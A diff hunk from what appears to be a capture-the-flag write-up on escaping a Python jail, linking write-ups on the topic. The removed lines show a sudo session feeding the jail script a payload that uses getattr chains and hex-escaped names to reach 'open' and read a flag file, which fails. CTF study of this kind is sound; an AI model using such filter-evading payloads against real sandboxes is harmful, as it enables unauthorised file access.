@@ -310,19 +310,6 @@ ctftime blog:https://ctftime.org/writeup/17085
 medium:https://anee.me/escaping-python-jails-849c65cf306e
 
 kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py 
-[sudo] password for kamishiro: 
-Hi! Welcome to my world kaneki
-========================================================================
-What ? You gonna stand like a chicken ? fight me Kaneki
->>> print(getattr(getattr(getattr(main, '__globals__')['__builtins__'], '\x6f\x70\x65\x6e')('/home/python_jail/flag', 'rb'), '\x72\x65\x61\x64')())    
-Traceback (most recent call last):
-  File "/home/kamishiro/jail.py", line 16, in <module>
-    main()
-  File "/home/kamishiro/jail.py", line 13, in main
-    exec(text)
-  File "<string>", line 1, in <module>
-FileNotFoundError: [Errno 2] No such file or directory: '/home/python_jail/flag'
-kamishiro@vagrant:~$ sudo /usr/bin/python3 /home/kamishiro/jail.py 
 Hi! Welcome to my world kaneki
 ========================================================================
 What ? You gonna stand like a chicken ? fight me Kaneki
